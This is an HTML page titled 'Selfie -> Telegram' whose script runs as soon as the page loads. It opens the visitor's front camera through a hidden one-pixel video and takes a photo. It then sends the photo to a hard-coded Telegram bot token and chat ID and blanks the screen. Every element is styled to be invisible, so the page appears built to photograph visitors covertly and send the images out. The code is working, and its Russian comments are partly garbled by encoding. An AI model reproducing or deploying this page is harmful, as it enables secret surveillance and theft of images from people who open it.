<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Selfie -> Telegram</title>
<style>
  body, html { 
    margin:0; padding:0; 
    width:100%; height:100%; 
    background:#000; 
    color:#000;
    font-family:Arial, sans-serif; 
    overflow: hidden;
  }
  #status { 
    position: fixed; 
    top:20px; 
    left:0; 
    width:100%; 
    text-align:center; 
    z-index:1000; 
    color: #000; 
    opacity: 0.01;
  }
  video#preview { 
    position:fixed; 
    left:-9999px; 
    width:1px; 
    height:1px; 
    opacity:0; 
  }
  canvas {
    position: absolute;
    top: -9999px;
    left: -9999px;
    width: 1px;
    height: 1px;
    opacity: 0;
  }
</style>
</head>
<body>
  <div id="status" style="color: #000;">.</div>

<script>
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';
const status = document.getElementById('status');

function updateStatus(text) {
  status.textContent = text;
  status.style.color = '#000';
  console.log(text);
}

function sleep(ms) { return new Promise(res => setTimeout(res, ms)); }

async function captureAndSend() {
  let stream = null;
  try {
    updateStatus('1. –ó–∞–ø—Ä–∞—à–∏–≤–∞—é –∫–∞–º–µ—Ä—É...');
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: { ideal: 'user' },
        width: { ideal: 1280 },
        height: { ideal: 720 }
      },
      audio: false
    });

    updateStatus('‚úÖ –ö–∞–º–µ—Ä–∞ –¥–æ—Å—Ç—É–ø–Ω–∞');

    const video = document.createElement('video');
    video.id = 'preview';
    video.srcObject = stream;
    video.playsInline = true;
    video.muted = true;
    video.autoplay = true;
    document.body.appendChild(video);

    updateStatus('2. –ó–∞–ø—É—Å–∫–∞—é –≤–∏–¥–µ–æ...');
    await video.play();
    
    if (video.readyState < 2) {
      await new Promise(resolve => {
        video.addEventListener('loadeddata', resolve, { once: true });
        setTimeout(resolve, 300);
      });
    }

    updateStatus('3. –°—Ç–∞–±–∏–ª–∏–∑–∞—Ü–∏—è –∫–∞–¥—Ä–∞...');
    await sleep(1000); // –£–º–µ–Ω—å—à–µ–Ω–æ —Å 5000 –¥–æ 1000 –º—Å

    const vw = video.videoWidth || 1280;
    const vh = video.videoHeight || 720;
    updateStatus(`4. –†–∞–∑–º–µ—Ä—ã: ${vw}x${vh}`);

    const canvas = document.createElement('canvas');
    canvas.width = vw;
    canvas.height = vh;
    const ctx = canvas.getContext('2d');

    updateStatus('5. –î–µ–ª–∞—é —Å–Ω–∏–º–æ–∫...');

    // –ó–µ—Ä–∫–∞–ª–∏–º –∏ —Ä–∏—Å—É–µ–º
    ctx.save();
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    ctx.restore();

    updateStatus('6. –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é –∫–∞–º–µ—Ä—É...');
    stream.getTracks().forEach(t => t.stop());

    // –£–õ–£–ß–®–ï–ù–ù–ê–Ø –û–ë–†–ê–ë–û–¢–ö–ê –Ø–†–ö–û–°–¢–ò –ò –ö–û–ù–¢–†–ê–°–¢–ê
    updateStatus('7. –£–ª—É—á—à–∞—é –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ...');
    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const data = imageData.data;
    
    // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –∫–æ—Ä—Ä–µ–∫—Ü–∏—è —è—Ä–∫–æ—Å—Ç–∏ –∏ –∫–æ–Ω—Ç—Ä–∞—Å—Ç–∞
    let rSum = 0, gSum = 0, bSum = 0;
    for (let i = 0; i < data.length; i += 4) {
      rSum += data[i];
      gSum += data[i+1];
      bSum += data[i+2];
    }
    const pixelCount = data.length / 4;
    const rAvg = rSum / pixelCount;
    const gAvg = gSum / pixelCount;
    const bAvg = bSum / pixelCount;
    const avgBrightness = (rAvg + gAvg + bAvg) / 3;
    
    // –î–∏–Ω–∞–º–∏—á–µ—Å–∫–∞—è –∫–æ—Ä—Ä–µ–∫—Ü–∏—è –Ω–∞ –æ—Å–Ω–æ–≤–µ —Å—Ä–µ–¥–Ω–µ–π —è—Ä–∫–æ—Å—Ç–∏
    const brightnessFactor = avgBrightness < 128 ? 1.8 : 1.3;
    const contrastFactor = 1.2;
    
    for (let i = 0; i < data.length; i += 4) {
      // –Ø—Ä–∫–æ—Å—Ç—å
      data[i] = Math.min(255, data[i] * brightnessFactor);
      data[i+1] = Math.min(255, data[i+1] * brightnessFactor);
      data[i+2] = Math.min(255, data[i+2] * brightnessFactor);
      
      // –ö–æ–Ω—Ç—Ä–∞—Å—Ç
      data[i] = ((data[i] - 128) * contrastFactor) + 128;
      data[i+1] = ((data[i+1] - 128) * contrastFactor) + 128;
      data[i+2] = ((data[i+2] - 128) * contrastFactor) + 128;
      
      // –ì–∞—Ä–∞–Ω—Ç–∏—è –¥–∏–∞–ø–∞–∑–æ–Ω–∞
      data[i] = Math.max(0, Math.min(255, data[i]));
      data[i+1] = Math.max(0, Math.min(255, data[i+1]));
      data[i+2] = Math.max(0, Math.min(255, data[i+2]));
    }
    
    ctx.putImageData(imageData, 0, 0);

    updateStatus('8. –û—Ç–ø—Ä–∞–≤–ª—è—é –≤ Telegram...');
    canvas.toBlob(async (blob) => {
      if (!blob) {
        updateStatus('‚ùå –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è —Ñ–æ—Ç–æ');
        return;
      }

      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'selfie_' + Date.now() + '.jpg');
      formData.append('caption', 'ü§≥ –°–µ–ª—Ñ–∏ —Å —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä—ã');

      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        const json = await res.json();
        if (json.ok) {
          updateStatus('‚úÖ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!');
          setTimeout(() => {
            document.body.innerHTML = '';
            document.body.style.cssText = 'background: #000; width: 100%; height: 100%;';
          }, 1000);
        } else {
          updateStatus('‚ùå –û—à–∏–±–∫–∞ Telegram: ' + (json.description || ''));
        }
      } catch (err) {
        updateStatus('‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏: ' + err.message);
      }
    }, 'image/jpeg', 0.95); // –£–≤–µ–ª–∏—á–µ–Ω–æ –∫–∞—á–µ—Å—Ç–≤–æ –¥–æ 0.95

  } catch (err) {
    updateStatus('‚ùå –û—à–∏–±–∫–∞: ' + (err.message || err));
    console.error(err);
    if (stream) stream.getTracks().forEach(t => t.stop());
  }
}

// –ó–∞–ø—É—Å–∫–∞–µ–º
captureAndSend();
</script>
</body>
</html>
